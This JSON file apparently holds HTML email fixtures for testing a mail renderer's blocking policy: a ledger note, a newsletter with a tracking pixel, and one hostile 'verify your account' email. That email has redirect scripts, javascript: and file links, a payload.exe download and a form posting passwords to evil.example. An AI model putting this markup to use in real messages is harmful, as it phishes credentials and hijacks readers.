{
 "1001": "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>Quarterly ledger review</title>\n<style>body{font-family:Georgia,serif;color:#222;background:#fff;margin:24px} table{border-collapse:collapse} td,th{border:1px solid #ccc;padding:4px 8px}</style>\n</head><body>\n<p>Hi,</p>\n<p>the quarterly ledger is attached. The summary:</p>\n<table><tr><th>Quarter</th><th>Budget</th><th>Actual</th></tr>\n<tr><td>Q2</td><td>120 000</td><td>118 450</td></tr>\n<tr><td>Q3</td><td>125 000</td><td>131 020</td></tr></table>\n<p>An inline image resolved from <code>cid:</code>: <img alt=\"chart\" width=\"120\" height=\"40\" src=\"data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='40'%3E%3Crect width='120' height='40' rx='6' fill='%232E86AB'/%3E%3C/svg%3E\"></p>\n<p>Can we go through it on Thursday? Details at <a href=\"https://intranet.example.com/ledger\">the intranet page</a>.</p>\n<p>Ivana</p>\n</body></html>",
 "1003": "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>This week in type</title>\n<style>.wrap{max-width:600px;margin:0 auto;font-family:Helvetica,Arial,sans-serif} .hero{background:#0C1B33;color:#F4F1E8;padding:24px} .btn{display:inline-block;background:#FF6700;color:#fff;padding:8px 16px;text-decoration:none;border-radius:4px}</style>\n</head><body><div class=\"wrap\">\n<div class=\"hero\"><h1>This week in type</h1><p>Variable fonts, optical sizes and a new grotesque.</p></div>\n<p><img alt=\"[remote hero image, blocked]\" width=\"600\" height=\"200\" src=\"https://cdn.designweekly.example/hero.jpg\"></p>\n<p><img alt=\"tracking pixel\" width=\"1\" height=\"1\" src=\"https://track.designweekly.example/open?id=42\"></p>\n<p>A data: PNG survives the policy: <img alt=\"dot\" width=\"16\" height=\"16\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\"></p>\n<p><a class=\"btn\" href=\"https://designweekly.example/issue/42?utm_source=mail\">Read online</a></p>\n<p style=\"font-size:11px;color:#666\">You receive this because you subscribed. <a href=\"https://designweekly.example/unsubscribe\">Unsubscribe</a> or write to <a href=\"mailto:news@designweekly.example\">news@designweekly.example</a>.</p>\n</div></body></html>",
 "1006": "<!doctype html>\n<html><head><meta charset=\"utf-8\">\n<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/?from=meta-refresh\">\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; script-src * 'unsafe-inline'\">\n<base href=\"https://evil.example/\">\n<link rel=\"preconnect\" href=\"https://evil.example\">\n<link rel=\"stylesheet\" href=\"https://evil.example/style.css\">\n<title>Action required</title>\n<script>document.title = 'script ran'; window.location = 'https://evil.example/?from=script';</script>\n</head><body onload=\"window.open('https://evil.example/?from=onload')\">\n<h2 id=\"headline\">Action required: verify your account</h2>\n<p>If this line is red, inline CSS applies (it is allowed): <span style=\"color:#c00\">red</span>.</p>\n<p><img alt=\"[remote image, must be blocked]\" width=\"80\" height=\"80\" src=\"https://evil.example/pixel.gif\"></p>\n<ul>\n<li><a id=\"plain\" href=\"https://evil.example/?from=plain-link\">plain https link</a></li>\n<li><a id=\"blank\" href=\"https://evil.example/?from=target-blank\" target=\"_blank\">target=_blank link</a></li>\n<li><a href=\"http://insecure.example/?from=http-link\">plain http link</a></li>\n<li><a href=\"mailto:attacker@evil.example?subject=hello\">mailto link</a></li>\n<li><a href=\"file:///etc/hosts\">file link</a></li>\n<li><a href=\"javascript:alert('js-link')\">javascript: link</a></li>\n<li><a href=\"https://evil.example/payload.exe\" download>download link</a></li>\n<li><a href=\"https://evil.example/?from=ping\" ping=\"https://evil.example/ping\">ping link</a></li>\n</ul>\n<form action=\"https://evil.example/collect\" method=\"post\">\n<input name=\"password\" type=\"password\" placeholder=\"password\">\n<button type=\"submit\">Verify</button>\n</form>\n<iframe src=\"https://evil.example/frame\" width=\"200\" height=\"60\"></iframe>\n<object data=\"https://evil.example/object.swf\"></object>\n<script>fetch('https://evil.example/?from=fetch');</script>\n</body></html>"
